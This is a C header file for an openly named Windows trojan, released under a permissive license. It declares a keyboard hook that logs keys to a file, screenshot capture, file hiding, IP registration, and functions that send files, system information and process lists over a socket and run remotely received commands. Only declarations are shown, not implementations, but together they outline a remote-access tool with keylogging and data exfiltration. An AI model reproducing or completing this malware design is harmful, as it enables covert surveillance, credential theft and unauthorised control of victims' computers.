/*
author: Forec
last edit date: 2016/09/15
email: forec@bupt.edu.cn
						LICENSE
Copyright (c) 2015-2017, Forec <forec@bupt.edu.cn>

Permission to use, copy, modify, and/or distribute this code for any
purpose with or without fee is hereby granted, provided that the above
copyright notice and this permission notice appear in all copies.

THE SOFTWARE IS PROVIDED "AS IS" AND THE AUTHOR DISCLAIMS ALL WARRANTIES
WITH REGARD TO THIS SOFTWARE INCLUDING ALL IMPLIED WARRANTIES OF
MERCHANTABILITY AND FITNESS. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR
ANY SPECIAL, DIRECT, INDIRECT, OR CONSEQUENTIAL DAMAGES OR ANY DAMAGES
WHATSOEVER RESULTING FROM LOSS OF USE, DATA OR PROFITS, WHETHER IN AN
ACTION OF CONTRACT, NEGLIGENCE OR OTHER TORTIOUS ACTION, ARISING OUT OF
OR IN CONNECTION WITH THE USE OR PERFORMANCE OF THIS SOFTWARE.
*/

#ifndef __TROJAN_H_
#define __TROJAN_H_

#include <Winsock2.h>
#include <windows.h>  
#include <TlHelp32.h>
#include <stdlib.h>
#include <stdio.h>
#include <conio.h>
#include <string.h>
#include <lm.h>

#define MAXLEN 20000

#define RECV_BUFLEN MAXLEN
#define SEND_BUFLEN MAXLEN
#define KEY_BUFLEN MAXLEN
#define CMD_BUFLEN MAXLEN
#define INFO_BUFLEN 100

#pragma once
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "netapi32.lib")

const char g_szClassName[] = "trojanWindow";
const char keyboard_save_file[] = "E:\\key.log";
const char screenshot_save_file[] = "E:\\screen.bmp";

extern HHOOK hook; 
extern HANDLE hMutex;
extern char keyBuffer[KEY_BUFLEN];
extern char temp[MAXLEN + 4];

inline LPCWSTR stringToLPCWSTR(const char *src);

bool getScreenShot(const char *path);

bool hideFile(const char *path);

bool registerIP(char *info);

bool sendFile(SOCKET &socket, const char *path);

bool sendSystemInfo(SOCKET &socket);

bool getCurrentProcesses(char *buf, const unsigned int buflen);

bool runCommand(char *cmdStr, SOCKET &sock);

bool dealWithCommand(char *sendBuf, char *recvBuf, int recvLen, SOCKET &socket);

unsigned int readFileIntoBuf(FILE **fp, char *buf, unsigned int buflen);

int send_s(SOCKET &sock, const char *buf, INT32 sendlen);

int recv_s(SOCKET &sock, char *buf, unsigned int buflen);

void RegisterTrojanWindow(HINSTANCE hInstance);

DWORD WINAPI ThreadProc(LPVOID lpThreadParameter);

HWND CreateTrojanWindow(HINSTANCE hInstance);

LRESULT CALLBACK WindowProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam);

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);

#endif